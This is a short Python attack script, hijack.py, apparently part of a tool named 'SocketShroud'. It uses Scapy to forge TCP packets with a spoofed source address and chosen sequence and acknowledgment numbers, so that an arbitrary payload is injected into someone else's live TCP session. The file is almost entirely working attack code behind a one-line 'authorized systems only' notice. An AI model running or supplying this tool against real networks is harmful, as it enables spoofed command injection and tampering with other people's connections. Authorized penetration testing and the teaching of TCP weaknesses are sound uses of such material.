#!/usr/bin/env python3
"""
hijack.py - TCP session hijacking/injection module.

This script injects data into an existing TCP session by forging a packet 
with specific IP, TCP parameters, and a custom payload.
Uses Scapy to construct and send packets.
NOTE: Use only on authorized systems!
"""

import sys
import argparse
from scapy.all import IP, TCP, Raw, send
from core.utils import setup_logger, validate_port

logger = setup_logger("SocketShroud:Hijack")

def hijack_session(target_ip: str, target_port: int, src_ip: str, src_port: int, seq: int, ack: int, payload: str):
    logger.info(f"Hijacking session to {target_ip}:{target_port} from spoofed {src_ip}:{src_port}")
    packet = (IP(src=src_ip, dst=target_ip) /
              TCP(sport=src_port, dport=target_port, seq=seq, ack=ack, flags="PA") /
              Raw(load=payload))
    logger.info("Sending forged TCP packet...")
    send(packet, verbose=False)
    logger.info("Packet sent successfully.")

def main():
    parser = argparse.ArgumentParser(description="Hijack a TCP session by injecting a payload")
    parser.add_argument("target_ip", help="Target IP address")
    parser.add_argument("target_port", type=validate_port, help="Target port")
    parser.add_argument("src_ip", help="Spoofed source IP address")
    parser.add_argument("src_port", type=validate_port, help="Spoofed source port")
    parser.add_argument("seq", type=int, help="TCP sequence number")
    parser.add_argument("ack", type=int, help="TCP acknowledgment number")
    parser.add_argument("payload", help="Payload to inject")
    args = parser.parse_args()
    hijack_session(args.target_ip, args.target_port, args.src_ip, args.src_port, args.seq, args.ack, args.payload)

if __name__ == '__main__':
    main()
    logger.info("Starting TCP session hijack...")